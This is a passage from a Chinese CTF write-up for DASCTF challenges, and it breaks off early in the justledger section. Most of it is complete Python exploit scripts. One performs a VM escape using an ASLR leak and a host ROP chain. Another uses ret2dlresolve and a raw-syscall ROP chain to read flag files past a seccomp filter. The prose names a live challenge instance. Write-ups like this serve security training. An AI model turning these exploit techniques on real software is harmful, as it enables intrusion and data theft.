第三阶段绕过 ASLR。在同一个虚拟机进程内运行约五亿条指令的 guest 循环，会触发 user instruction limit reached；该路径会把与 PIE 基址相关的 poison 写到 CPU state 加 0x20 的位置，下一次进入用户态时会把它混合，并向 guest 地址 0xe1e0 写出四个完整的 64 位值。guest 把这四个值 dump 出来，逆向混合过程即可恢复精确的 PIE 基址，过程在虚拟机内约需 26 秒，结果与调试器一致。拿到基址后构造 ROP 链，用 pop rdi/rsi/rdx/rax 加 syscall;ret 的 gadget，在同一个宿主进程中从标准输入读取路径名，再 open、read、write 把文件内容打印出来，远程读取 flag 得到 DASCTF{79376082025581919530205451854008}。本题的精华是 guest 越界写在宿主内核校验盲区里变成内核栈覆盖，内核的 MMIO cache 又恰好映射到宿主栈，而 ASLR 绕过利用的是虚拟机指令上限错误状态与进入用户态的混合逻辑。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

主利用脚本的代码如下。

```python
#!/usr/bin/env python3
"""FedResNyFinLedgerOs (12069) full exploit.

Stage 1: in-VM assembler builds a user program that burns 500M user
instructions; the host raises 'user instruction limit reached', which sets the
base-dependent poison token in the CPU state.
Stage 2: the next program launch (ENTERU) mixes the poison with per-boot
randomness and writes four full 64-bit values to guest 0xe1e0.  The user
program dumps them; the mix is invertible -> recovers the host PIE base.
Stage 3: same VM process; the guest kernel-stack overwrite drives MMIO cache
writes past ZCACHE into main's saved RIP; the host ROP reads pathnames from
stdin and dumps each file via open/read/write syscalls (seccomp-allowed).
"""
import sys, os, time, socket, subprocess, platform, struct, argparse
HERE=os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0,HERE)
from invert import solve2
import exploit as E

POP_RDI=0x9e29; POP_RSI=0xdeea; POP_RAX=0x33d03; POP_RDX=0x87aca; SYSCALL=0x1c576
PATH_BASE=0xce000      # writable PIE RW segment
DATA_BASE=0xd0000
RODATA_PROOF=0xa38ca   # "Usage: %s\n"

def build_rop(base, np, marker=True):
    A=lambda o: base+o
    w=[]
    if marker:
        w += [A(POP_RDI),1, A(POP_RSI),A(RODATA_PROOF), A(POP_RDX),0x10,0,0,0,0, A(POP_RAX),1, A(SYSCALL)]
    for i in range(np):
        poff=PATH_BASE+i*0x100; doff=DATA_BASE+i*0x1000
        w += [A(POP_RDI),0, A(POP_RSI),A(poff), A(POP_RDX),0x100,0,0,0,0, A(POP_RAX),0, A(SYSCALL)]
        w += [A(POP_RDI),4, A(POP_RAX),3, A(SYSCALL)]                      # close(4)
        w += [A(POP_RDI),A(poff), A(POP_RSI),0, A(POP_RAX),2, A(SYSCALL)]   # open
        w += [A(POP_RDI),4, A(POP_RSI),A(doff), A(POP_RDX),0x1000,0,0,0,0, A(POP_RAX),0, A(SYSCALL)]
        w += [A(POP_RDI),1, A(POP_RSI),A(doff), A(POP_RDX),0x1000,0,0,0,0, A(POP_RAX),1, A(SYSCALL)]
    w += [A(POP_RAX),0x3c, A(SYSCALL),0]
    payload=bytearray(0xab8)
    for i,v in enumerate(w):
        payload[8*i:8*i+8]=(v&0xffffffffffffffff).to_bytes(8,'little')
    if 0x0a in payload:
        raise SystemExit('newline byte in stage A payload')
    return bytes(payload)

GUEST_STAGE3=['LDI R0, 0','LDI R1, 0x6000','LDI R2, 0x0ab8','SYSCALL 0',
              'LDI R0, 0','LDI R1, 0x3e00','LDI R2, 0x200','SYSCALL 0',
              'LDI R3, 2','SYSCALL 2']

def sh_commands(prog,name,outname,run=True):
    cmds=[];chunk='';first=True
    for l in prog:
        p=l+'\\n'
        if len(chunk)+len(p)>70:
            cmds.append(('run write %s "%s"'%(name,chunk)) if first else ('run append %s "%s"'%(name,chunk)))
            first=False;chunk=''
        chunk+=p
    if chunk: cmds.append(('run write %s "%s"'%(name,chunk)) if first else ('run append %s "%s"'%(name,chunk)))
    cmds += ['rm %s'%outname,'run as %s %s'%(name,outname)]
    if run: cmds.append('run %s'%outname)
    return cmds

class Link:
    def __init__(self, argv=None, host=None, port=None):
        self.p=None; self.buf=b''
        if host:
            self.b=socket.create_connection((host,port),timeout=10)
        else:
            a,b=socket.socketpair()
            self.p=subprocess.Popen(argv,stdin=a.fileno(),stdout=a.fileno(),stderr=a.fileno(),close_fds=True)
            a.close(); self.b=b
    def send(self,d): self.b.sendall(d)
    def _recv(self):
        self.b.settimeout(0.4)
        try: return self.b.recv(65536)
        except socket.timeout:
            return None
        except (ConnectionResetError,OSError):
            return b''
    def read_until(self,marker,timeout):
        t=time.time()
        while time.time()-t<timeout:
            if marker in self.buf:
                i=self.buf.find(marker)+len(marker)
                out=self.buf[:i]; self.buf=self.buf[i:]; return out
            c=self._recv()
            if c is None:
                if self.p is not None and self.p.poll() is not None: break
                continue
            if c==b'': break
            self.buf+=c
        out=self.buf; self.buf=b''; return out
    def drain(self,timeout,idle=0.8):
        t=time.time(); last=time.time(); out=b''
        while time.time()-t<timeout:
            c=self._recv()
            if c is None:
                if self.p is not None and self.p.poll() is not None: break
                if time.time()-last>=idle: break
                continue
            if c==b'': break
            out+=c; last=time.time()
        return out
    def close(self):
        try:
            if self.p is not None: self.p.kill()
        except Exception: pass
        try: self.b.close()
        except Exception: pass

def run(link, paths, verbose=True):
    link.read_until(b'yolo> ',10)
    # Stage 1: instruction limit
    t0=time.time()
    link.send(('\n'.join(sh_commands(['JMP 0x8000'],'a.asm','a.bin'))+'\n').encode())
    out=link.read_until(b'user instruction limit reached',300)
    if verbose: print('[1] limit fault in %.1fs'%(time.time()-t0), flush=True)
    if b'user instruction limit reached' not in out:
        link.close(); return None
    link.drain(5,idle=0.8)
    # Stage 2: dump 32 bytes at 0xe1e0
    p2=['LDI R0, 1','LDI R1, 0xe1e0','LDI R2, 0x20','SYSCALL 1','LDI R3, 2','SYSCALL 2']
    link.send(('\n'.join(sh_commands(p2,'b.asm','b.bin'))+'\n').encode())
    out=link.drain(16,idle=1.5)
    idx=out.rfind(b'yolo> ')
    rec=out[max(0,idx-32):idx] if idx>=32 else b''
    if len(rec)!=32:
        if verbose: print('[2] record missing len=%d'%len(rec), repr(out[-400:]))
        link.close(); return None
    Y=struct.unpack('<QQQQ',rec)
    if verbose: print('[2] Y =',' '.join('%016x'%y for y in Y), flush=True)
    cands=solve2(*Y)
    bases=[b for v,X,b,oe,oi in cands if (b&0xfff)==0 and (oe or oi) and 0x400000 <= b < 0x800000000000]
    if not bases:
        if verbose: print('[2] no base candidate')
        link.close(); return None
    base=bases[0]
    if verbose: print('[+] PIE base = 0x%x'%base, flush=True)
    # Stage 3
    stream=('\n'.join(sh_commands(GUEST_STAGE3,'c.asm','c.bin'))+'\n').encode()+build_rop(base,len(paths))+E.build_stage_b()
    for p in paths:
        b=p.encode()+b'\x00'
        stream += b + b'\x00'*(0x100-len(b))
    link.send(stream)
    out=link.drain(35,idle=3.0)
    link.close()
    return out, base

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument('--host'); ap.add_argument('--port',type=int,default=0)
    ap.add_argument('--vm',default=os.path.join(HERE,'clean','vm'))
    ap.add_argument('--setarch',action='store_true')
    ap.add_argument('--cwd',default=None)
    ap.add_argument('--paths',default='/flag,flag,flag.txt,/flag.txt')
    ap.add_argument('--out',default='')
    a=ap.parse_args()
    paths=[p for p in a.paths.split(',') if p]
    if a.cwd: os.chdir(a.cwd)
    if a.host:
        link=Link(host=a.host,port=a.port)
    else:
        argv=[a.vm] if not a.setarch else ['setarch',platform.machine(),'-R',a.vm]
        link=Link(argv=argv)
    r=run(link,paths)
    if not r:
        print('FAILED'); return
    out,base=r
    if a.out: open(a.out,'wb').write(out)
    txt=out
    print('[out] %d bytes'%len(txt))
    for pat in [b'DASCTF{', b'flag{', b'Usage']:
        print('  ',pat, pat in txt)
    sys.stdout.buffer.write(txt[-200:]); print()

if __name__=='__main__':
    main()
```

ASLR 逆向的代码如下。

```python
M64=(1<<64)-1
C1=0x9d3a6f5c2b7e184d; C2=0x5e8c1b47a3f9602d
C3=0x3f1d9b7a5c2e8461; C4=0x6b2e8f4a9c5d1731
POISON_CONST=0xc7e59b3d1f82640a
POISON_OFF=0xc87d0
def rol(x,n): return ((x<<n)|(x>>(64-n)))&M64
def ror(x,n): return ((x>>n)|(x<<(64-n)))&M64
def inv_xorshr(x,s):
    # invert x ^= x>>s
    y=x
    shift=s
    while shift<64:
        y ^= x>>shift
        shift+=s
    return y&M64
def core(x):
    a=x&M64
    a^=a>>33
    a=(a*C1)&M64
    a=rol(a,19)
    a^=a>>29
    a=(a*C2)&M64
    a^=a>>37
    a=rol(a,11)
    a^=a>>43
    return a&M64
def core_inv(y):
    a=y&M64
    a=inv_xorshr(a,43)
    a=ror(a,11)
    a=inv_xorshr(a,37)
    a=(a*pow(C2,-1,1<<64))&M64
    a=inv_xorshr(a,29)
    a=ror(a,19)
    a=(a*pow(C1,-1,1<<64))&M64
    a=inv_xorshr(a,33)
    return a&M64
def H(x):
    t=x&M64
    t^=t>>29
    t^=t>>47
    return core(t)
def H_inv(y):
    a=core_inv(y)
    a=inv_xorshr(a,47)
    a=inv_xorshr(a,29)
    return a&M64
def solve(Y0,Y1,Y2,Y3,verbose=False):
    A=core_inv(Y0)
    B1=H_inv(Y1); B2=H_inv(Y2); B3=H_inv(Y3)
    if verbose: print('A=%016x B1=%016x B2=%016x B3=%016x'%(A,B1,B2,B3))
    U3=(C3^A)&M64; U4=(C4^A)&M64
    # bitwise lift v118
    cands=[0]
    for i in range(64):
        m=(1<<(i+1))
        new=[]
        for c in cands:
            for bit in (0,1):
                v=c | (bit<<i)
                M=v|2
                if ((U3*M - B1) & (m-1))!=0: continue
                if ((U4*M - B3) & (m-1))!=0: continue
                X=A^v
                if ((((X|2)&M64)*A - B2) & (m-1))!=0: continue
                new.append(v)
        # dedupe
        cands=list(set(new))
        if not cands: return None
        if len(cands)>64: cands=cands[:64]
    out=[]
    for v in cands:
        M=(v|2)&M64
        X=A^v
        if ((U3*M)&M64)==B1 and ((U4*M)&M64)==B3 and ((((X|2)&M64)*A)&M64)==B2:
            # v118 has bit1 ambiguity? we already tried both bits via lift; v is a full candidate
            base=((v ^ POISON_CONST) - POISON_OFF)&M64
            out.append((v,X,base))
    return out
if __name__=='__main__':
    Y0=0x61b09fd612e88692; Y1=0x699c0fbad57c0003; Y2=0xbb46728a8cf4e2e1; Y3=0xf76da7201758d30e
    print('expected v118=0xc7e5e4c2e87d43da base=0x7ffff7f2a000')
    for v,X,base in solve(Y0,Y1,Y2,Y3,verbose=True):
        print('v118=%016x X=%016x base=%016x'%(v,X,base))

def solve2(Y0,Y1,Y2,Y3,verbose=False):
    A=core_inv(Y0)
    B1=H_inv(Y1); B2=H_inv(Y2); B3=H_inv(Y3)
    if verbose: print('A=%016x B1=%016x B2=%016x B3=%016x'%(A,B1,B2,B3))
    U3=(C3^A)&M64; U4=(C4^A)&M64
    cands=[0]
    for i in range(64):
        m=(1<<(i+1))
        new=[]
        for c in cands:
            for bit in (0,1):
                v=c|(bit<<i)
                M=v|2
                if ((U3*M-B1)&(m-1))!=0: continue
                if ((U4*M-B3)&(m-1))!=0: continue
                new.append(v)
        cands=list(set(new))
        if not cands: return []
        if len(cands)>256: cands=cands[:256]
    out=[]
    for v in cands:
        M=(v|2)&M64
        if ((U3*M)&M64)!=B1 or ((U4*M)&M64)!=B3: continue
        X=A^v
        # else branch
        ok_e = ((H(((X|2)&M64)*A&M64))==Y2)
        # if branch
        shift=((X>>19)%29)*2+1
        B2i=(rol(v,shift)^X)&M64
        ok_i = (core(B2i)==Y2)
        base=((v^POISON_CONST)-POISON_OFF)&M64
        out.append((v,X,base,ok_e,ok_i))
    return out
```

虚拟机与 ROP 原语的代码如下。

```python
#!/usr/bin/env python3
"""
FedResNyFinLedgerOs (DASCTF 2026, ID 12069) - YOLOOS VM escape exploit.

Chain:
  guest user program (assembled with the in-VM assembler) ->
  kernel stack overwrite via SYS_READ(0, 0x3e00, 0x200) (v2 buffer validation allows 0x3000-0xefff) ->
  ret2kernel gadgets 0x1a9e (pop R2/pop R1/ret), 0x16e4 (pop R3/ret), 0x1331 (cache store loop) ->
  MMIO cache (0xf300..0xffff) writes beyond the kernel's 0x200-byte ZCACHE into the host stack slot
  holding main's saved RIP (cache offset 0x248) and following qwords ->
  host ROP: open(path)/read(fd=4)/write(1) with the seccomp-allowed syscalls ->
  flag to stdout.

Addresses used by default are the deterministic no-ASLR layout
(setarch -R / gdb default):
  PIE base  = 0x7ffff7f2a000
  saved RIP slot Z = 0x7fffffffdc58   (main's rsp + 0x608; caller-frame env shift dependent)
If the deployment has ASLR enabled this exploit will not work without a host
address leak - not found so far.

Usage:
  python3 exploit.py local            # runs clean/vm under setarch -R with a fake flag
  python3 exploit.py run ./vm         # runs a given local vm binary with ASLR as-is
  python3 exploit.py remote HOST PORT # sends the exploit to a remote vm over TCP
Options: --base, --z (stack slot), --paths comma separated, --out payload.bin
"""
import argparse, os, platform, socket, struct, subprocess, sys, tempfile, time

# ---- fixed gadgets / constants (offsets in the static PIE) ----
POP_RDI   = 0x9e29   # pop rdi ; ret
POP_RSI   = 0xdeea   # pop rsi ; ret
POP_RAX   = 0x33d03  # pop rax ; ret
POP_RDX   = 0x87aca  # pop rdx ; xor eax,eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
SYSCALL   = 0x1c576  # syscall ; ret

# guest kernel gadget addresses (inside image RAM, 16-bit)
K_POP_R2_R1 = 0x1a9e   # POP R2; POP R1; RET
K_POP_R3    = 0x16e4   # POP R3; RET
K_CACHE_LOOP= 0x1331   # LDI R0,0xf300; ADD R0,R3; PUSH R2; copy [R1] -> MMIO, wrap-stop
K_MOV_SP_R3 = 0x1ad1   # MOV SP,R3; RET  (0x1ad0 is MOV SP,R2; MOV SP,R3; RET)
K_IRET      = 0x13b3   # MOV R3,R0; IRET (deliberately faults: SP != 0x4000)

GUEST_ASM = [
    'LDI R0, 0', 'LDI R1, 0x6000', 'LDI R2, 0x0ab8', 'SYSCALL 0',
    'LDI R0, 0', 'LDI R1, 0x3e00', 'LDI R2, 0x200', 'SYSCALL 0',
    'LDI R3, 2', 'SYSCALL 2',
]

def build_host_payload(base, z, paths, str_off=0x800, buf_off=0x900):
    def A(off):
        return base + off

    def S(off):  # host address of a byte inside our stack payload
        return z + off

    # string placement, stride 0x20
    strings = {}
    off = str_off
    for p in paths:
        strings[p] = off
        off += 0x20
    if off > buf_off:
        raise SystemExit('too many paths')
    buf = S(buf_off)

    words = []
    words += [A(POP_RDX), 0x100, 0, 0, 0, 0]          # rdx=0x100, rax=0
    for p in paths:
        # open(p, O_RDONLY)
        words += [A(POP_RDI), S(strings[p]), A(POP_RSI), 0, A(POP_RAX), 2, A(SYSCALL)]
        # read(4, buf, 0x100)  (failed opens do not consume fd 4; success returns 4)
        words += [A(POP_RDI), 4, A(POP_RSI), buf, A(POP_RAX), 0, A(SYSCALL)]
    # write(1, buf, 0x100)
    words += [A(POP_RDI), 1, A(POP_RSI), buf, A(POP_RAX), 1, A(SYSCALL)]
    # exit(0)
    words += [A(POP_RAX), 0x3c, A(SYSCALL), 0]

    payload = bytearray(0xab8)
    if len(words) * 8 > str_off:
        raise SystemExit('rop too long')
    for i, w in enumerate(words):
        payload[8 * i:8 * i + 8] = (w & 0xffffffffffffffff).to_bytes(8, 'little')
    for p, o in strings.items():
        b = p.encode() + b'\x00'
        payload[o:o + len(b)] = b
    bad = [i for i, v in enumerate(payload) if v == 0x0a]
    if bad:
        raise SystemExit('newline in stage A at %s' % bad[:5])
    return bytes(payload)

def build_stage_b():
    stage = bytearray(0x200)
    # guest kernel stack chain at 0x3e00 (this is guest *physical* memory).
    # 0x189a = POP R1; RET, 0x16e4 = POP R3; RET.
    chain = [0x189a, 0x6000,       # R1 = payload source (guest 0x6000)
             K_POP_R3, 0x0248,      # R3 = cache offset of main's saved RIP
             K_CACHE_LOOP, K_IRET]
    for i, v in enumerate(chain):
        stage[2 * i:2 * i + 2] = v.to_bytes(2, 'little')
    # buffer offsets 0x1fc/0x1fe -> guest 0x3ffc/0x3ffe: live return address of
    # the kernel's cache->user copy at 0x1385.
    stage[0x1fc:0x1fe] = (0x3e00).to_bytes(2, 'little')  # R3 -> pivot target
    stage[0x1fe:0x200] = (K_MOV_SP_R3).to_bytes(2, 'little')
    if 0x0a in stage:
        raise SystemExit('newline in stage B')
    return bytes(stage)

def build_stream(base, z, paths):
    # shell commands to assemble/run the guest program
    cmds, chunk, first = [], '', True
    for line in GUEST_ASM:
        p = line + '\\n'
        if len(chunk) + len(p) > 70:
            cmds.append(('run write ex.asm "%s"' if first else 'run append ex.asm "%s"') % chunk)
            first, chunk = False, ''
        chunk += p
    if chunk:
        cmds.append(('run write ex.asm "%s"' if first else 'run append ex.asm "%s"') % chunk)
    cmds += ['rm ex.bin', 'run as ex.asm ex.bin', 'run cat ex.bin', 'run ex.bin']
    return ('\n'.join(cmds) + '\n').encode() + build_host_payload(base, z, paths) + build_stage_b()

def run_local(vm_path, data, setarch=False):
    argv = [vm_path]
    if setarch:
        argv = ['setarch', platform.machine(), '-R', vm_path]
    p = subprocess.run(argv, input=data, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                       timeout=30, cwd=os.path.dirname(os.path.abspath(vm_path)) or '.')
    sys.stdout.buffer.write(p.stdout)
    sys.stdout.buffer.flush()
    print('\n[rc=%s]' % p.returncode)

def run_remote(host, port, data, timeout=10):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(data)
    out = b''
    s.settimeout(3.0)
    try:
        while True:
            b = s.recv(4096)
            if not b:
                break
            out += b
    except socket.timeout:
        pass
    s.close()
    sys.stdout.buffer.write(out)
    sys.stdout.buffer.flush()
    print('\n[remote bytes=%d]' % len(out))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('mode', choices=['local', 'run', 'remote'])
    ap.add_argument('args', nargs='*')
    ap.add_argument('--base', type=lambda x: int(x, 0), default=0x7ffff7f2a000)
    ap.add_argument('--z', type=lambda x: int(x, 0), default=0x7fffffffdc58)
    ap.add_argument('--paths', default='/flag,flag,flag.txt,/flag.txt,key,/key')
    ap.add_argument('--out', default='')
    a = ap.parse_args()
    paths = [p for p in a.paths.split(',') if p]
    data = build_stream(a.base, a.z, paths)
    if a.out:
        open(a.out, 'wb').write(data)
        print('[written %s %d bytes]' % (a.out, len(data)))
    if a.mode == 'local':
        vm = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'clean', 'vm')
        run_local(vm, data, setarch=True)
    elif a.mode == 'run':
        run_local(a.args[0], data, setarch=False)
    else:
        host, port = a.args[0], int(a.args[1])
        run_remote(host, port, data)

if __name__ == '__main__':
    main()
```

### Goodbye!shell

Goodbye!shell是一道栈溢出题。程序为非 PIE 的 x86-64 ELF，未去符号，部分 RELRO，没有 canary；main 中安装了 seccomp 过滤器，只禁止 execve 与 execveat，因此常规的 system("/bin/sh") 不可用，但 openat、read、write 的 ORW 路线可行。漏洞函数向一个 0x20 字节的栈缓冲区读取 0x30 字节，溢出 16 字节，正好覆盖保存的 rbp 与返回地址；由于程序非 PIE，并且存在可重复进入的入口点 0x40122b，这个 16 字节溢出可以被转化为多次 48 字节的任意写原语。

最初的思路是 ret2dlresolve，在栈上伪造 Elf64_Sym 与 Elf64_Rela 并调用 PLT0 解析符号；本地可以走通，但远程 glibc 会拒绝越界的伪造符号项并报未定义符号与空名称。修正方案是把伪造的重定位项放进可写的.bss，并引用真实存在的动态符号下标，例如 write 为 4、read 为 6，名称仍使用真实的动态字符串，这样解析器只做合法解析。另一个坑是 resolver 的栈下界：若伪造数据地址小于 0x404f40，保存与符号查找会向下溢入只读的 RELRO 页并触发访问错误，因此把数据布局抬到 0x404f40 以上。第三个坑是题目自带的 openat 实现会用 canary 收尾指令把 RDX 清零，导致无法设置 read 长度；最终改为先用 resolver 的重定位字段做存储侧信道泄露 libc 地址，恢复 read 的 GOT，再使用带 add rsp,0x18 跳板的裸系统调用 ROP 链执行 openat、read、write。远程对 1.14.76.59:24696 一次成功，读出 DASCTF{55357378852365389715701218631867}。seccomp 只禁止 execve 时 ORW 是标准解，而 ret2dlresolve 跨 libc 版本时容易踩到伪造符号校验的坑，改用真实符号下标加可写重定位更稳。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

最终利用脚本的代码如下。

```python
#!/usr/bin/env python3
# Goodbye!shell (12067) full exploit.
# Stage A (leak): ret2dlresolve "write" with r_offset in .bss; resolver stores libc write
#   address at LEAK then calls write(1, LEAK, 0x30).  A second pre-staged fake rela
#   resolves "read" into read@GOT and reads 0x30 bytes back, restoring the normal BODY
#   read primitive.  Then we know libc base.
# Stage B (ROP): BODY 48-byte writes build a raw-syscall ROP chain in .bss using
#   0x30-byte "windows" with add rsp,0x18 skips over the 16-byte staging continuations.
#   openat(AT_FDCWD, path, 0x100) -> read(fd, BUF, 0x100) -> write(1, BUF, 0x100).
import sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

PWN = './pwn'
LD  = './ld-linux-x86-64.so.2'

BODY    = 0x40122b
PLT0    = 0x401020
GADGET  = 0x401210
RET     = 0x40101a
LEAVE   = 0x40121d

DYNSTR = 0x400490
SYMTAB = 0x4003d0
JMPREL = 0x400590

# ---- leak-stage layout (verified against pwn's dynamic tables) ----
SYM1  = 0x404060; SYM1_IDX  = 4    # REAL dynsym index of write (remote glibc rejects fake syms)
SYM2  = 0x404078; SYM2_IDX  = 6    # REAL dynsym index of read
RELA1 = 0x4040a0; RELA1_IDX = (RELA1 - JMPREL)//24   # 630
RELA2 = 0x4040b8; RELA2_IDX = (RELA2 - JMPREL)//24   # 631
ST_NAME_WRITE = 0x40   # .dynstr contains "write" at 0x4004d0
ST_NAME_READ  = 0x3b   # .dynstr contains "read"  at 0x4004cb
B1    = 0x404f80   # stage-1 trigger frame / leak buffer start = B1-0x20
LEAK  = B1 - 0x20  # 0x404f60 (r_offset for fake rela #1, also write(1,...,0x30) buffer)
Q1    = 0x404fc0   # stage-2 trigger frame
Q2    = 0x404620   # rbp after second resolution == first ROP window R0
assert RELA1_IDX*24 + JMPREL == RELA1 and RELA2_IDX*24 + JMPREL == RELA2

def p64(x): return int(x & 0xffffffffffffffff).to_bytes(8,'little')
def p32(x): return int(x & 0xffffffff).to_bytes(4,'little')
def p16(x): return int(x & 0xffff).to_bytes(2,'little')

def fake_sym(st_name):
    return p32(st_name) + bytes([0x12,0]) + p16(0) + p64(0) + p64(0)

def fake_rela(symidx, r_off):
    return p64(r_off) + p64((symidx<<32)|7) + p64(0)

def leak_chunks():
    """Return list of (rbp, payload48) in execution order for stage A."""
    st1 = ST_NAME_WRITE
    st2 = ST_NAME_READ
    C = []
    # 0: fake sym1 @0x404060 (write)
    C.append((0x404080, fake_sym(st1) + b'\x00'*8 + p64(0x404300) + p64(BODY)))
    # 1: mule @0x4042e0
    C.append((0x404300, b'M'*32 + p64(0x404098) + p64(BODY)))
    # 2: fake sym2 @0x404078 (read)
    C.append((0x404098, fake_sym(st2) + b'\x00'*8 + p64(0x404320) + p64(BODY)))
    # 3: mule @0x404300
    C.append((0x404320, b'N'*32 + p64(0x4040c0) + p64(BODY)))
    # 4: fake rela1 @0x4040a0: r_offset=LEAK -> libc write address stored there
    C.append((0x4040c0, fake_rela(SYM1_IDX, LEAK) + b'\x00'*8 + p64(0x404340) + p64(BODY)))
    # 5: mule @0x404320
    C.append((0x404340, b'O'*32 + p64(0x4040d8) + p64(BODY)))
    # 6: fake rela2 @0x4040b8: r_offset=read@GOT -> restore read, then read(0,LEAK,0x30)
    C.append((0x4040d8, fake_rela(SYM2_IDX, 0x404038) + b'\x00'*8 + p64(B1) + p64(BODY)))
    # 7: Bp @LEAK: fd1=1 at B1-8
    C.append((B1, b'\x00'*0x18 + p64(1) + p64(0x404360) + p64(BODY)))
    # 8: mule
    C.append((0x404360, b'P'*32 + p64(0x404fa0) + p64(BODY)))
    # 9: w1 @B1: stage-1 frame
    w1 = p64(Q1) + p64(PLT0) + p64(RELA1_IDX) + p64(GADGET) + p64(0x404380) + p64(BODY)
    C.append((0x404fa0, w1))
    # 10: mule
    C.append((0x404380, b'Q'*32 + p64(Q1) + p64(BODY)))
    # 11: C @Q1-0x20: fd2=0 at Q1-8, continuation -> mule
    C.append((Q1, b'\x00'*0x18 + p64(0) + p64(0x404700) + p64(BODY)))
    # 12: mule
    C.append((0x404700, b'R'*32 + p64(Q1+0x20) + p64(BODY)))
    # 13: D @Q1: stage-2 frame
    Dp = p64(Q2) + p64(PLT0) + p64(RELA2_IDX) + p64(BODY) + p64(0x404050) + p64(BODY)
    C.append((Q1+0x20, Dp))
    # 14: GOT @0x404030: seccomp_load=RET, read=GADGET, continuation -> trigger B1
    C.append((0x404050, p64(RET) + p64(GADGET) + p64(0) + p64(0) + p64(B1) + p64(BODY)))
    return C

# ---------------- ROP stage gadgets (offsets in provided libc) ----------------
G_POP_RDI   = 0x2a3e5
G_POP_RSI   = 0x2be51
G_POP_RDX_RBX = 0x90469
G_POP_RAX   = 0x45eb0
G_SYSCALL   = 0x912d6
G_XCHG_EAX_EDI = 0x15bfd5
G_POP_RSP   = 0x35732
G_ADD18     = 0x3a889
LIBC_WRITE  = 0x1149c0

BUF = 0x404300
PATH_W = 0x404200
PATH = PATH_W
F_W = 0x404a00
W0 = Q2 - 0x20  # 0x404600

def build_chain_windows(base):
    """Return dict i -> 32 bytes of chain slot data (s0..s3) for window i."""
    add = base + G_ADD18
    pop_rdi = base + G_POP_RDI
    pop_rsi = base + G_POP_RSI
    pop_rdx_rbx = base + G_POP_RDX_RBX
    pop_rax = base + G_POP_RAX
    syscall = base + G_SYSCALL
    xchg = base + G_XCHG_EAX_EDI
    pop_rsp = base + G_POP_RSP
    W = [W0 + 0x30*i for i in range(13)]
    Z = lambda v: p64(v)
    slots = {}
    # normal windows 0,1: one-pop gadgets
    slots[0] = Z(pop_rdi) + Z(-100) + Z(add) + Z(0)
    slots[1] = Z(pop_rsi) + Z(PATH)  + Z(add) + Z(0)
    # normal window 2: pop rdx; pop rbx; ret -> transitions to shifted mode
    slots[2] = Z(pop_rdx_rbx) + Z(0x100) + Z(0xdeadbeef) + Z(add)
    # shifted windows 3,4: openat
    slots[3] = Z(0) + Z(pop_rax) + Z(257) + Z(add)
    slots[4] = Z(0) + Z(syscall) + Z(add) + Z(0)
    # normal window 5: xchg eax,edi -> pop rsp -> shifted W6
    slots[5] = Z(xchg) + Z(pop_rsp) + Z(W[6]+8) + Z(0)
    slots[6] = Z(0) + Z(pop_rsi) + Z(BUF) + Z(add)
    slots[7] = Z(0) + Z(pop_rax) + Z(0) + Z(add)
    slots[8] = Z(0) + Z(syscall) + Z(add) + Z(0)   # read(fd,BUF,0x100)
    slots[9] = Z(pop_rdi) + Z(1) + Z(add) + Z(0)
    slots[10] = Z(pop_rsi) + Z(BUF) + Z(add) + Z(0)
    slots[11] = Z(pop_rax) + Z(1) + Z(add) + Z(0)
    slots[12] = Z(syscall) + Z(0) + Z(0) + Z(0)    # write(1,BUF,0x100)
    return slots

def rop_stage_chunks(base, path_bytes):
    """Return list of (rbp,payload) to send after read@GOT is restored."""
    slots = build_chain_windows(base)
    C = []
    Rs = [W0 + 0x20 + 0x30*i for i in range(13)]
    for i in range(13):
        nxt = Rs[i+1] if i < 12 else PATH_W + 0x20   # continue to path chunk
        C.append((Rs[i], slots[i] + p64(nxt) + p64(BODY)))
    # path chunk @PATH_W: path string, continuation -> F
    path = path_bytes.ljust(0x20, b'\x00')[:0x20]
    C.append((PATH_W + 0x20, path + p64(F_W + 0x20) + p64(BODY)))
    # F chunk: pivot to chain via leave;ret with rbp=W0-8
    C.append((F_W + 0x20, b'F'*0x20 + p64(W0 - 8) + p64(LEAVE)))
    return C

def start(local, host=None, port=None):
    if local:
        return process([LD, '--library-path', '.', PWN], cwd='.')
    return remote(host, port)

def exploit(local=True, host=None, port=None, path=b'flag', timeout=6):
    io = start(local, host, port)
    lc = leak_chunks()
    io.recvuntil(b'Give me your name: ')
    io.send(b'A'*32 + p64(lc[0][0]) + p64(BODY))
    io.recvuntil(b'Goodbye!s')
    for i,(rbp,pay) in enumerate(lc):
        assert len(pay)==48, (i,len(pay))
        io.send(pay)
        io.recvuntil(b'Goodbye!s')
    # first resolution fired: write(1, LEAK, 0x30)
    leak = io.recvn(0x30, timeout=timeout)
    libc_write = u64(leak[:8])
    base = libc_write - LIBC_WRITE
    log.info('leak: %s libc_write=%#x base=%#x', leak.hex(), libc_write, base)
    # second resolution: read(0, LEAK, 0x30) consumes 48 bytes silently
    io.send(b'X'*0x30)
    # now BODY(Q2) is active with read@GOT restored; stage the ROP chain
    for i,(rbp,pay) in enumerate(rop_stage_chunks(base, path)):
        assert len(pay)==48, (i,len(pay))
        io.send(pay)
    out = io.recvrepeat(timeout)
    try: io.close()
    except Exception: pass
    return leak, base, out

if __name__ == '__main__':
    local = (len(sys.argv) < 3)
    host = None if local else sys.argv[1]
    port = None if local else int(sys.argv[2])
    path = b'flag'
    if len(sys.argv) >= 4: path = sys.argv[3].encode()
    leak, base, out = exploit(local=local, host=host, port=port, path=path)
    print("[*] leak   :", leak.hex())
    print("[*] base   :", hex(base))
    print("[*] output :", repr(out))
```

### justledger

justledger是一道多进程账本服务利用题。监听进程接受连接后 fork 子进程，把客户端 socket 作为标准输入输出，把 broker 的 unix socket 连接作为另一个文件描述符，然后执行作为 SQLite shell 的 justledger 并加载账本探针模块；broker 对每个连接降权到 uid 1001，再通过自己的 unix socket 代理到 vault；vault 降权到 uid 1002，在降权前打开 flag 文件并读取若干次空设备后安装 seccomp，之后提供一个小型协议。三个进程各有一个可用的原语，利用方式是逐级桥接文件描述符。

